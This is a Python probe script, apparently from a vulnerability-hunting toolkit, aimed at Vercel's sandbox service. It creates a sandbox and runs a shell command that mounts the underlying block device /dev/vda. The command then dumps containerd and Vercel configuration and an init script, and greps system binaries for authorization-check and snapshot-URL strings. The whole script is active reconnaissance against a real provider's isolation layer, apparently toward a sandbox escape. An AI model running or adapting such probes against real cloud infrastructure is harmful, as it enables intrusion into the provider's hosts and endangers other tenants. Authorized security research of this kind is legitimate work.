# -*- coding: utf-8 -*-
"""v64u 探测: containerd 配置 + not authorized 上下文 + AllowedSnapshotBaseUrls 逻辑"""
import sys, os, time, json
sys.path.insert(0, r'D:\scan\skills\non-traditional-vuln-hunting')
sys.stdout.reconfigure(encoding='utf-8')
from vercel_driver import api, TEAM, PROJ

NAME = 'v64u'
sid = None


def main():
    global sid
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    time.sleep(2)
    c, r = api('POST', '/v2/sandboxes?teamId=%s' % TEAM, {"projectId": PROJ, "name": NAME}, timeout=120)
    print('[create]', c, r[:200])
    if c != 200:
        raise SystemExit('create failed')
    sid = json.loads(r)['sandbox']['currentSessionId']
    time.sleep(2)
    s = ('mkdir -p /mnt/vdax; sudo mount /dev/vda /mnt/vdax 2>&1; '
         'echo ===ETC_CTD===; ls -la /mnt/vdax/etc/containerd/ 2>&1; '
         'echo ===CFG===; cat /mnt/vdax/etc/containerd/config.toml 2>&1 | head -100; '
         'echo ===CELLD_CFG===; ls -la /mnt/vdax/etc/vercel/ /mnt/vdax/etc/opt/ 2>&1 | head -20; '
         'echo ===AUTH_CTD===; grep -a -o -E ".{0,120}not authorized.{0,160}" /mnt/vdax/usr/bin/containerd 2>/dev/null | head -8; '
         'echo ===AUTH_CELLD===; grep -a -o -E ".{0,140}not authorized.{0,200}" /mnt/vdax/opt/vercel/celld 2>/dev/null | head -8; '
         'echo ===ALLOWED_CELLD===; grep -a -o -E ".{0,100}AllowedSnapshotBaseUrls.{0,200}" /mnt/vdax/opt/vercel/celld 2>/dev/null | head -8; '
         'echo ===ALLOWED_CTD===; grep -a -o -E ".{0,100}allowed_snapshot_base_urls.{0,200}" /mnt/vdax/usr/bin/containerd 2>/dev/null | head -8; '
         'echo ===ETC_LS===; ls /mnt/vdax/etc/ 2>&1 | head -40; '
         'echo ===CELLD_INIT===; cat /mnt/vdax/opt/vercel/celld-init.sh 2>&1 | head -30')
    c, r = api('POST', '/v2/sandboxes/sessions/%s/cmd?teamId=%s' % (sid, TEAM),
               {"command": "sh", "args": ["-c", s], "wait": True, "logs": True, "timeout": 90000},
               timeout=130)
    print('[cmd]', c)
    print((r or '')[:22000])
    api('DELETE', '/v2/sandboxes/%s?teamId=%s&projectId=%s' % (NAME, TEAM, PROJ))
    print('CLEANED')


if __name__ == '__main__':
    main()
